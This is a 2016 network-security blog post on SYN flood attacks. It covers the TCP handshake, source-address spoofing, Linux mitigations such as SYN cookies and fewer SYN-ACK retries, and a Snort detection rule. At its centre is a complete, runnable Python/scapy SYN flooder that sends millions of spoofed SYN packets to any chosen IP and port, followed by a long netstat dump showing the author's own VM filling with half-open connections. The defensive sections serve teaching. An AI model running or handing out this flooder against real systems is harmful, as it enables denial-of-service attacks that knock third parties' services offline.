---
date: 2016-06-22
title: 'Creating SYN flood attacks with Python'
template: post
slug: creating-syn-flood-attacks-with-python
categories:
 - Network Security
tags:
 - Network Security
---

Today it's very easy for people to download tools that overwhelm computer systems *(denial of service)* in order to take them offline. There are different types of attacks that can be used to create a denial of service attack, one of them is the SYN flood attack which this article will cover. I will also show how to develop your own SYN flooder and some protection mitigations.

## What is a SYN flood attack?
The SYN flood attack works by the attacker opening multiple "half made" connections and not responding to any `SYN_ACK` packets. In order to understand the SYN flood attack it is vital to understand the TCP 3-way handshake first.

### TCP handshake
When a client wants to talk to a server over TCP, the client initiates what is called the *3-way handshake*. It begins with the client sending a `SYN` packet to the server, the server receives the packet and responds with a `SYN_ACK` indicating to the client that it received the initial `SYN` packet. When the client receives the `SYN_ACK` it will reply with an `ACK` packet which now establishes a connection between the client and server and they can begin exchanging data. A visual representation can be seen below.

![](../images/Tcp_normal.svg)

### The SYN flood attack
We now know that clients and servers establishes a connection by completing a handshake with each other, what happens if you do not complete the handshake? By sending multiple `SYN` packets to the victim and not responding with an `ACK` message to the victim's `SYN_ACK` message, the victim will have a multiple "half" open connections causing the victim's connection table to potentially overflow .

### SYN spoofing
An attacker could also spoof the source address of the initial `SYN` packets causing the victim to send `SYN_ACK` messages to an other host, which will respond with a `RST` packet indicating to drop the connection causing the SYN attack to fail. In order for the spoofing to work the attacker needs to select source addresses where there exists no hosts that can respond.

## Protection
There are different ways to limit the effects of SYN flood/spoof attacks, some of are:

#### Remove random connections
Start deleting random "half made" connections, this can however delete legitimate connections.

#### Reduce time in SYN_RECEIVED state
When you send SYN packet to a server the connection will be placed in a `SYN_RECV` state and the server will respond with a `SYN_ACK` packet. The server will resend `SYN_ACK` a few times until an `ACK` is received, during this time the connection is still placed in a `SYN_RECV` state. This means the server needs to keep track of thousands of connections which can overflow the server's connection table. By reducing the `SYN_ACK` retries the server will close connections placed in a `SYN_RECV` state earlier which can be very helpful protecting against SYN flood attacks.

In Linux you can edit **/etc/sysctl.conf** and change `net.ipv4.tcp_synack_retries` from the default value 5 to something lower depending on fast you want your system to close connections in a `SYN_RECV` state. The default value 5 leaves connections in `SYN_RECV` state open for 3 minutes and a value of 3 leaves connections open for roughly 45 seconds. After you have modified the file you can make your changes permanent by running `sysctl –p /etc/sysctl.conf` and verify that is has been changed by:

```
root@ajax:~# cat /proc/sys/net/ipv4/tcp_synack_retries
1
```

#### SYN cookies
Instead of the server keeping track of states for each connection which allocates memory, we can use SYN cookies instead. When a `SYN` is received a hash is computed based on meta information. The receiver (server) sends a `SYN_ACK` with the hash and does not allocate any memory yet, only the hash is stored. The hash consists of the the following:

```
Initial Sequence Number (ISN) = hash(source_ip, source_port, destination_ip, destination_port, client's ISN, secret)
```

The sender must send an `ACK` with this hash so that the receiver can compare with the stored hash, if success than allocate memory and data structures.

Enabling SYN cookies in linux is very easy. Edit the file **/etc/sysctl.conf** and make the following modification:

```
net.ipv4.tcp_syncookies = 1
```

Save and run `sysctl -p` to make the change permanent. 

## Building a simple SYN flooder with Python using scapy
Building your own SYN flooder is not difficult and can easily be done with Python and scapy. Below I have written a simple SYN flooder that will send spoofed SYN packets to any target. The program will send 64511 SYN packets *per spoofed IP* which means a total of 16 385 794 packets! 

```
#!/usr/bin/env python3

"""Simple SYN Flooder and spoofer
 - @mjdubell

This software is intended for educational purposes and
can only be used against systems with permission from owner.
The user is the only one responsible for any damages. By using this
software you agree with the terms.

Usage:
  syn_flooder.py <dst_ip> <dst_port> [--sleep=<sec>] [--verbose] [--very-verbose]

Options:
  -h, --help            Show this screen.
  --version             Show version.
  --sleep=<seconds>     How many seconds to sleep betseen scans [default: 0].
  --verbose             Show addresses being spoofed. [default: False]
  --very-verbose        Display everything. [default: False]

"""
from docopt import docopt
import logging
import signal
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def main(arguments):
    src_net = "192.168.250."
    dst_ip = arguments["<dst_ip>"]
    dst_port = int(arguments["<dst_port>"])
    sleep = int(arguments["--sleep"])
    verbose = arguments["--verbose"]
    very_verbose = arguments["--very-verbose"]

    signal.signal(signal.SIGINT, lambda n, f: sys.exit(0))

    print("\n###########################################")
    print("# Starting Denial of Service attack...")
    print(f"# Target: {dst_ip}")
    print("###########################################\n")
    for src_host in range(1,254):
        if verbose or very_verbose:
            print(f"[*] Sending spoofed SYN packets from {src_net}{src_host}")
            print("--------------------------------------------")

        for src_port in range(1024, 65535):
            if very_verbose:
                print(f"[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}")

            # Build the packet
            src_ip = src_net + str(src_host)
            network_layer = IP(src=src_ip, dst=dst_ip)
            transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")

            # Send the packet
            send(network_layer/transport_layer, verbose=False)

            if sleep != 0:
                time.sleep(sleep)

    print("[+] Denial of Service attack finished.")

if __name__ == '__main__':
    arguments = docopt(__doc__, version="SYN Flooder 1.5")
    main(arguments)

```
##### Project can be found here: https://github.com/mjdubell/SYN-Flooder

I ran the program against my debian virtual machine to see if my code worked:

```
root@ajax:~# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      790/exim4
tcp        0      0 0.0.0.0:58873           0.0.0.0:*               LISTEN      509/rpc.statd
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      500/rpcbind
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      525/sshd
tcp        0      0 192.168.1.93:22         192.168.3.1:2045        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1885        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1828        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1878        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1102        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1090        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1148        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1101        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1129        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1172        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1169        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1173        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1829        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1089        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2056        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2040        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1247        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1153        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1072        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1143        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1881        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1852        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1274        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2057        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1277        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1088        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1880        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1164        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1119        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1860        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1134        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1163        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1115        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1075        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1876        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1250        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1103        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2061        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1186        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1109        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1135        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1883        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1168        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1887        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2066        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1191        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1141        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1827        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1246        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2041        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1892        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2035        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2073        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1255        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1145        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1144        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1151        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1147        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1161        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1890        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1104        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1863        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1194        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1128        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1278        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1259        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1193        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1187        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1851        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1266        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1263        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1251        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1181        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2036        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1895        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1154        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1125        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1182        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2072        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1265        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1257        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1201        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1275        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1116        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1167        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2060        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1877        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1888        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1176        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1884        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1139        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2055        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1137        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1160        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1091        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1098        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2068        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2037        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2071        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2034        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1894        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1156        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1092        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1886        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:2064        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1889        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1177        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1107        SYN_RECV    -
tcp        0      0 192.168.1.93:22         192.168.3.1:1085        SYN_RECV    -
tcp        0  40152 192.168.1.93:22         192.168.1.207:59318     ESTABLISHED 4638/sshd: user [p
tcp6       0      0 ::1:25                  :::*                    LISTEN      790/exim4
tcp6       0      0 :::111                  :::*                    LISTEN      500/rpcbind
tcp6       0      0 :::39185                :::*                    LISTEN      509/rpc.statd
tcp6       0      0 :::22                   :::*                    LISTEN      525/sshd
root@ajax:~#
```

As we can see, there is a lot of connections placed in a `SYN_RECV` state meaning the virtual machine replied with a `SYN-ACK` but is waiting for an `ACK` from the spoofed address. I never ran the program to completion but if had done that, there would be thousands of connections stuck in a `SYN_RECV` state, potentially causing a denial of service.

## Detection
Using an **Intrusion Detection System** such as Snort, it's possible to detect SYN flood attacks. Since I am running Snort in my network, I decided to create a snort rule to detect when running my SYN flooder program. Below you will find the rule:

```
alert tcp any any -> 192.168.1.0/24 any ( msg:"Possible SYN flood"; classtype:attempted-dos; sid:1999999; flags:S; flow: stateless; detection_filter: track by_dst, count 50, seconds 10;)
```

This rule will alert every SYN packet during one sampling period of 10 seconds, after the first 50 SYN packets. However this rule may not apply for all network environments. Depending on your needs you may need to increase/decrease the count or amount of seconds.

## Conclusion
Protecting against DoS attacks, particular SYN flood attacks with spoofing can be difficult. But there are some security measures that can be taken which will hopefully reduce the effects of a DoS attack. Using SYN cookies, IDS/IPS or simply reducing time spent in `SYN_RECV` state are all possible methods to stop or reduce DoS attacks. 

More information about protecting against SYN flood attacks can be found in the [RFC 4987](https://tools.ietf.org/html/rfc4987). Writing rules for snort: http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html


